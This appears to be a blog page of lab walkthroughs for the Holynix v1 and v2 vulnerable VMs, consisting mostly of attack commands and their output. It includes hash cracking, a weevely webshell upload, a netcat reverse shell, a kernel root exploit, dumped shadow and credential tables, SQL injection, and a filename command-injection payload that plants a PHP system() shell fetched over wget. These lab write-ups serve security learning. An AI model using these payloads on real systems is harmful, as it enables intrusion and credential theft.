</span><span class='line'>ddypsky:$1$ccUhlpJ0$PO/WATKUekwaPct4zXeV9.:1031:2002::/home/ddypsky/./::::::::::::
</span><span class='line'>rcropper:$1$Qhw2Vff0$QDvQMEe9CGFwVrvVUPqTz0:1031:2002::/home/rcropper/./::::::::::::
</span><span class='line'>ddonnovan:$1$1z2APl80$uAyYFZLPu/WRkkpegD3Ht.:1031:2002::/home/ddonnovan/./::::::::::::
</span><span class='line'>cbergey:$1$MOwY3Ie0$LcgARpcVk8Hf8n.E7itC40:1031:2002::/home/cbergey/./::::::::::::
</span><span class='line'>tmartin:$1$3jpH7Yk0$2XmRv6acGEkBjmNQeyzUz.:1031:2002::/home/tmartin/./::::::::::::
</span><span class='line'>jgacy:$1$b.0bYDi0$sSMXaRDSZu8YvWVz.wfCo0:1031:2002::/home/jgacy/./::::::::::::
</span><span class='line'>splath:$1$jbdcsaj0$7uaXto3yRZWwDp5VEbJQV/:1031:2002::/home/splath/./::::::::::::
</span><span class='line'>skrymple:$1$zjyNa1C0$x2JA4Tm61q3N0Fq06gXun1:1031:2002::/home/skrymple/./::::::::::::
</span><span class='line'>evorhees:$1$ITHWZZd0$Qhs38Q7QpRTe./Npk25hu/:1031:2002::/home/evorhees/./::::::::::::
</span><span class='line'>rfrost:$1$3Nqexaj0$eJv5nfOYM71jvlTEA1iv..:1031:2002::/home/rfrost/./::::::::::::
</span><span class='line'>ahuxley:$1$ObpCAT60$LTqCcrqMGAgv8YMyva5Sr0:1031:2002::/home/ahuxley/./::::::::::::
</span><span class='line'>cmanson:$1$gMHNCq70$RCOXC8pfElSRvh5BFc5fF0:1031:2002::/home/cmanson/./::::::::::::
</span><span class='line'>webmaster:$1$v2tdHOX0$MnLOX4cXqZYL99QbDDZ/1/:1031:2002::/var/www/./::::::::::::</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# john hashes.john --wordlist="/usr/share/wordlists/rockyou.txt"  --rules
</span><span class='line'>millionaire      (tmartin)
</span><span class='line'>chatterbox1      (cbergey)
</span><span class='line'>bravenewworld    (ahuxley)</span></code></pre></td></tr></table></div></figure>


<p>We uploaded weevely to web directory of tmartin user via ftp:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ftp> put weevely.php
</span><span class='line'>local: weevely.php remote: weevely.php
</span><span class='line'>200 PORT command successful
</span><span class='line'>150 Connecting to port 49625
</span><span class='line'>226-File successfully transferred
</span><span class='line'>226 0.000 seconds (measured here), 1.87 Mbytes per second
</span><span class='line'>610 bytes sent in 0.00 secs (29785.2 kB/s)</span></code></pre></td></tr></table></div></figure>


<p>The kernel was vulnerable (vmsplice, 5092.c) and because weevely shell always
logged out root user, we used reverse shell and the writable /dev/shm
directory.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb/platforms/linux/local# nc -lvp 1337
</span><span class='line'>listening on [any] 1337 ...
</span><span class='line'>
</span><span class='line'>www-data@:/dev/shm $ :backdoor.reversetcp 192.168.1.34 -port 1337 -vector netcat-bsd
</span><span class='line'>[backdoor.reversetcp] [!] Error: Binding socket [Errno 98] Address already in use
</span><span class='line'>
</span><span class='line'>www-data@:/dev/shm $ :file.upload /usr/share/exploitdb/platforms/linux/local/5092 5092</span></code></pre></td></tr></table></div></figure>


<p>On our Kali Linux:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>connect to [192.168.1.34] from www.zincftp.com [192.168.1.88] 49100
</span><span class='line'>/bin/sh: can't access tty; job control turned off
</span><span class='line'>$ chmod +x 5092
</span><span class='line'>$ ./5092
</span><span class='line'>bash: no job control in this shell
</span><span class='line'>root@holynix2:/dev/shm# cat /etc/shadow
</span><span class='line'>root:$1$wMs1EClc$90lJ2ckB8jbibX.yrE7ac0:14949:0:99999:7:::
</span><span class='line'>daemon:*:14949:0:99999:7:::
</span><span class='line'>bin:*:14949:0:99999:7:::
</span><span class='line'>sys:*:14949:0:99999:7:::
</span><span class='line'>sync:*:14949:0:99999:7:::
</span><span class='line'>games:*:14949:0:99999:7:::
</span><span class='line'>man:*:14949:0:99999:7:::
</span><span class='line'>lp:*:14949:0:99999:7:::
</span><span class='line'>mail:*:14949:0:99999:7:::
</span><span class='line'>news:*:14949:0:99999:7:::
</span><span class='line'>uucp:*:14949:0:99999:7:::
</span><span class='line'>proxy:*:14949:0:99999:7:::
</span><span class='line'>www-data:*:14949:0:99999:7:::
</span><span class='line'>backup:*:14949:0:99999:7:::
</span><span class='line'>list:*:14949:0:99999:7:::
</span><span class='line'>irc:*:14949:0:99999:7:::
</span><span class='line'>gnats:*:14949:0:99999:7:::
</span><span class='line'>nobody:*:14949:0:99999:7:::
</span><span class='line'>libuuid:!:14949:0:99999:7:::
</span><span class='line'>dhcp:*:14949:0:99999:7:::
</span><span class='line'>syslog:*:14949:0:99999:7:::
</span><span class='line'>klog:*:14949:0:99999:7:::
</span><span class='line'>bind:*:14949:0:99999:7:::
</span><span class='line'>sshd:*:14949:0:99999:7:::
</span><span class='line'>mysql:!:14949:0:99999:7:::
</span><span class='line'>lsanderson:$1$d1rHIv2m$301/2naFEYQbmjg/CJZbO0:14949:0:99999:7:::
</span><span class='line'>cfinnerly:$1$7BPRHJcw$3W/9R.1BNqMJvvHWSa9jC/:14949:0:99999:7:::
</span><span class='line'>ddonnovan:$1$.aIQOdgq$JnPLWS9ETJEmPvvMZFgqK.:14949:0:99999:7:::
</span><span class='line'>skrymple:$1$nCenIeL7$3fq23HWXI1/cYX7q9FGVa0:14949:0:99999:7:::
</span><span class='line'>amckinley:$1$cZn8zx7p$0oURMPJj4U9UM0XhmhQM71:14951:0:99999:7:::
</span><span class='line'>cmahong:!:14949:0:99999:7:::
</span><span class='line'>lnickerbacher:!:14949:0:99999:7:::
</span><span class='line'>jstreet:!:14949:0:99999:7:::
</span><span class='line'>rwoo:!:14949:0:99999:7:::
</span><span class='line'>kmccallum:!:14949:0:99999:7:::
</span><span class='line'>cjalong:!:14949:0:99999:7:::
</span><span class='line'>jsmith:!:14949:0:99999:7:::
</span><span class='line'>dhammond:!:14949:0:99999:7:::
</span><span class='line'>hmcknight:!:14949:0:99999:7:::
</span><span class='line'>lwestre:!:14949:0:99999:7:::
</span><span class='line'>gwelch:!:14949:0:99999:7:::
</span><span class='line'>dmoran:!:14949:0:99999:7:::
</span><span class='line'>dsummers:!:14949:0:99999:7:::
</span><span class='line'>bzimmerman:!:14949:0:99999:7:::
</span><span class='line'>ncobol:!:14949:0:99999:7:::
</span><span class='line'>ddypsky:!:14949:0:99999:7:::
</span><span class='line'>rcropper:!:14949:0:99999:7:::
</span><span class='line'>cbergey:!:14949:0:99999:7:::
</span><span class='line'>tmartin:!:14949:0:99999:7:::
</span><span class='line'>jgacy:!:14949:0:99999:7:::
</span><span class='line'>splath:!:14949:0:99999:7:::
</span><span class='line'>evorhees:!:14949:0:99999:7:::
</span><span class='line'>rfrost:!:14949:0:99999:7:::
</span><span class='line'>ahuxley:!:14949:0:99999:7:::
</span><span class='line'>webmaster:!:14949:0:99999:7:::
</span><span class='line'>cmanson:!:14949:0:99999:7:::
</span><span class='line'>vftp:!:14949:0:99999:7:::</span></code></pre></td></tr></table></div></figure>


<p>We also found:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@holynix2:/var/www/dev# cat dbconn.php
</span><span class='line'>&lt;?php
</span><span class='line'>        $db_host = 'localhost';
</span><span class='line'>        $db_user = 'root';
</span><span class='line'>        $db_pass = 'dynamo59956783';
</span><span class='line'>        $db_name = '_zincftp_data';
</span><span class='line'>        $conn = mysql_connect($db_host, $db_user, $db_pass) or die("Unable to connect to MySQL");
</span><span class='line'>        mysql_select_db($db_name,$conn) or die("Could not select Database");</span></code></pre></td></tr></table></div></figure>


<p>If there is not a vulnerable phpmyadmin, we can read the files to table too, according:</p>

<p>1) zincftp_data ->  Create new table on database zincftp_data</p>

<p>2) Name = ftp_pass, Number of fields = 1</p>

<p>3) Field = pass, Type = varchar, Length = 100</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SQL Query Window:
</span><span class='line'>
</span><span class='line'>LOAD DATA LOCAL INFILE '/etc/pure-ftpd/pureftpd.passwd' INTO TABLE ftp_pass LINES TERMINATED BY '\n'</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/10/holynix-v1/">Holynix: V1</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-10T13:54:06+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:54 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/holynix-v1,20/">Holynix: v1</a></p>

<p>We set networking in Vmware Fusion as &ldquo;Share with my Mac&rdquo; and check the
obtained IP address:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/var/db/vmware:
</span><span class='line'>lease 192.168.80.142 {
</span><span class='line'>        starts 4 2015/04/30 16:18:54;
</span><span class='line'>        ends 4 2015/04/30 16:48:54;
</span><span class='line'>        hardware ethernet 00:0c:29:bc:05:de;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap -sV -p- 192.168.80.142
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-27 07:16 CEST
</span><span class='line'>Nmap scan report for 192.168.80.142
</span><span class='line'>Host is up (0.00028s latency).
</span><span class='line'>Not shown: 65534 closed ports
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
</span><span class='line'>MAC Address: 00:0C:29:BC:05:DE (VMware)</span></code></pre></td></tr></table></div></figure>


<p>There is a SQL injection in the web login, we submit the following username and password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>test' or '1'='1</span></code></pre></td></tr></table></div></figure>


<p>Via security (ssp.php) we can disclose arbitrary file (for example /etc/passwd):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false
</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false
</span><span class='line'>klog:x:103:104::/home/klog:/bin/false
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>mysql:x:105:114:MySQL Server,,,:/var/lib/mysql:/bin/false
</span><span class='line'>alamo:x:1000:115::/home/alamo:/bin/bash
</span><span class='line'>etenenbaum:x:1001:100::/home/etenenbaum:/bin/bash
</span><span class='line'>gmckinnon:x:1002:100::/home/gmckinnon:/bin/bash
</span><span class='line'>hreiser:x:1003:50::/home/hreiser:/bin/bash
</span><span class='line'>jdraper:x:1004:100::/home/jdraper:/bin/bash
</span><span class='line'>jjames:x:1005:50::/home/jjames:/bin/bash
</span><span class='line'>jljohansen:x:1006:115::/home/jljohansen:/bin/bash
</span><span class='line'>ltorvalds:x:1007:113::/home/ltorvalds:/bin/bash
</span><span class='line'>kpoulsen:x:1008:100::/home/kpoulsen:/bin/bash
</span><span class='line'>mrbutler:x:1009:50::/home/mrbutler:/bin/bash
</span><span class='line'>rtmorris:x:1010:100::/home/rtmorris:/bin/bash</span></code></pre></td></tr></table></div></figure>


<p>With sqlmap we can dump the whole database (%40 means &lsquo;@&rsquo; character):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># sqlmap -u "http://192.168.80.142/index.php?page=login.php&user_name=a&password=a&Submit_button=Submit" --dump-all</span></code></pre></td></tr></table></div></figure>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.142/dump# cat creds/accounts.csv
</span><span class='line'>cid,upload,username,password
</span><span class='line'>1,0,alamo,Ih%40cK3dM1cR05oF7
</span><span class='line'>2,1,etenenbaum,P3n7%40g0n0wN3d
</span><span class='line'>3,1,gmckinnon,d15cL0suR3Pr0J3c7
</span><span class='line'>4,1,hreiser,Ik1Ll3dNiN%40r315er
</span><span class='line'>5,1,jdraper,p1%40yIngW17hPh0n35
</span><span class='line'>6,1,jjames,%40rR35t3D%40716
</span><span class='line'>7,1,jljohansen,m%40k1nGb0o7L3g5
</span><span class='line'>8,1,kpoulsen,wH%407ar37H3Fed5D01n
</span><span class='line'>9,0,ltorvalds,f%407H3r0FL1nUX
</span><span class='line'>10,1,mrbutler,n%405aHaSw0rM5
</span><span class='line'>11,1,rtmorris,Myd%40d51N7h3NSA</span></code></pre></td></tr></table></div></figure>


<p>Using sqlmap &ndash;passwords parameter we got:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>database management system users password hashes:
</span><span class='line'>[*] debian-sys-maint [1]:
</span><span class='line'>    password hash: %2A04DDBBF6BA7B43D9B78611E125C80124644D17B8
</span><span class='line'>[*] root [1]:
</span><span class='line'>    password hash: %2AA69F92BBDEA591F5BB9E4A049F0C181D6DB5177E</span></code></pre></td></tr></table></div></figure>


<p>Back to the web page, there is a cookie set as &lsquo;uid=1&rsquo;. We can try different
numbers, because not every user has allowed to upload file, see accounts.csv.</p>

<p>We disclose transfer.php script:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span> <span class="nv">$auth</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;&lt;h2&gt;Content Restricted&lt;/h2&gt;&lt;/center&gt;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span> <span class="nv">$upload</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>                <span class="nv">$homedir</span> <span class="o">=</span> <span class="s2">&quot;/home/&quot;</span><span class="o">.</span><span class="nv">$logged_in_user</span><span class="o">.</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
</span><span class='line'>                <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="s2">&quot;upload/&quot;</span><span class="p">;</span>
</span><span class='line'>                <span class="nv">$target</span> <span class="o">=</span> <span class="nv">$uploaddir</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="p">;</span>
</span><span class='line'>                <span class="nv">$uploaded_type</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
</span><span class='line'>                <span class="nv">$command</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>                <span class="nv">$ok</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">if</span> <span class="p">(</span> <span class="nv">$uploaded_type</span> <span class="o">==</span><span class="s2">&quot;application/gzip&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;autoextract&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;true&#39;</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$command</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="nv">$ok</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>                <span class="p">{</span>
</span><span class='line'>                        <span class="k">echo</span> <span class="s2">&quot;Sorry your file was not uploaded&quot;</span><span class="p">;</span>
</span><span class='line'>                        <span class="k">echo</span> <span class="s2">&quot;&lt;a href=&#39;?index.php?page=upload.php&#39; &gt;Back to upload page&lt;/a&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                        <span class="k">if</span><span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$target</span><span class="p">))</span>
</span><span class='line'>                        <span class="p">{</span>
</span><span class='line'>                                <span class="k">echo</span> <span class="s2">&quot;&lt;h3&gt;The file &#39;&quot;</span> <span class="o">.</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span> <span class="s2">&quot;&#39; has been uploaded.&lt;/h4&gt;&lt;br /&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>                                <span class="k">echo</span> <span class="s2">&quot;The ownership of the uploaded file(s) have been changed accordingly.&quot;</span><span class="p">;</span>
</span><span class='line'>                                <span class="k">echo</span> <span class="s2">&quot;&lt;br /&gt;&lt;a href=&#39;?page=upload.php&#39; &gt;Back to upload page&lt;/a&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>                                <span class="k">if</span> <span class="p">(</span> <span class="nv">$command</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
</span><span class='line'>                                <span class="p">{</span>
</span><span class='line'>                                        <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;sudo tar xzf &quot;</span> <span class="o">.</span><span class="nv">$target</span><span class="o">.</span> <span class="s2">&quot; -C &quot;</span> <span class="o">.</span><span class="nv">$homedir</span><span class="p">);</span>
</span><span class='line'>                                        <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;rm &quot;</span> <span class="o">.</span><span class="nv">$target</span><span class="p">);</span>
</span><span class='line'>                                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                                        <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;sudo mv &quot;</span> <span class="o">.</span><span class="nv">$target</span><span class="o">.</span> <span class="s2">&quot; &quot;</span> <span class="o">.</span><span class="nv">$homedir</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span><span class='line'>                                <span class="p">}</span>
</span><span class='line'>                                <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;/var/apache2/htdocs/update_own&quot;</span><span class="p">);</span>
</span><span class='line'>                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                                <span class="k">echo</span> <span class="s2">&quot;Sorry, there was a problem uploading your file.&lt;br /&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>                                <span class="k">echo</span> <span class="s2">&quot;&lt;br /&gt;&lt;a href=&#39;?page=upload.php&#39; &gt;Back to upload page&lt;/a&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>                        <span class="p">}</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;br /&gt;&lt;br /&gt;&lt;h3&gt;Home directory uploading disabled for user &quot;</span> <span class="o">.</span><span class="nv">$logged_in_user</span><span class="o">.</span> <span class="s2">&quot;&lt;/h3&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>As we can see from the source code, the filename is used in shell command and
we can inject malicious input. However the &lsquo;/&rsquo; or &lsquo;\&rsquo; characters are
prohibited, because in $target is stored only the value after (back)slash.</p>

<p>Locator (it never terminates, but confirms our finding):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Content-Disposition: form-data; name="uploaded"; filename=";yes;"</span></code></pre></td></tr></table></div></figure>


<p>We can evade the slash restriction encoding the payload as base64 (touch /tmp/owned):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Content-Disposition: form-data; name="uploaded"; filename=";`echo dG91Y2ggL3RtcC9vd25lZA==| base64 -d`;"</span></code></pre></td></tr></table></div></figure>


<p>There could be a problem with a bigger input (&ldquo;filename too long&rdquo;).</p>

<p>Similarly we upload the following base64 payload redirected to &lsquo;b.php&rsquo;:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/var/www# echo '&lt;?php system($_REQUEST['cmd']); ?>' | base64
</span><span class='line'>PD9waHAgc3lzdGVtKCRfUkVRVUVTVFtjbWRdKTsgPz4K</span></code></pre></td></tr></table></div></figure>


<p>We try our php shell and in the case of success, we upload weevely from our web server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.142/b.php?cmd=id
</span><span class='line'>http://192.168.80.142/b.php?cmd=wget 192.168.80.137/weevely.php.txt -O c.php</span></code></pre></td></tr></table></div></figure>




